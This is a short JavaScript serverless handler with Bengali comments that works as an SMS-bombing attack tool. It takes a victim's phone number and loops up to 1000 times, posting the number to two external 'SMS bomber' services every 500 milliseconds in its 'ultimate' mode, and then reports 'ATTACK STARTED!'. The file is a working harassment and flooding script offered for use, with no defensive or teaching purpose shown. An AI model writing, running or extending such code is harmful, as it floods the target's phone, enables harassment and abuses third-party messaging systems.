export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // Target links jeta tumi diyecho
  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  // Background task start (Vercel timeout er jonno async)
  const runAttack = async () => {
    const loopLimit = isUltimate ? 1000 : amount; // Ultimate mode e beshi loop
    const delay = isUltimate ? 500 : 2000; // Ultimate = 2 per second (500ms delay)

    for (let i = 0; i < loopLimit; i++) {
      // Duito link e ekshathe request pathabe
      const requests = targetLinks.map(link => 
        fetch(link, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ number: number }),
        }).catch(err => console.log("Link error:", err))
      );

      await Promise.all(requests);

      // Delay control
      await new Promise(resolve => setTimeout(resolve, delay));
      
      // 24h logic simulation (Vercel serverless e 24h continuous loop kothin, 
      // kintu loop limit diye eta handle kora jay)
    }
  };

  runAttack(); // Task start

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED!" : "ATTACK STARTED!" 
  });
          }
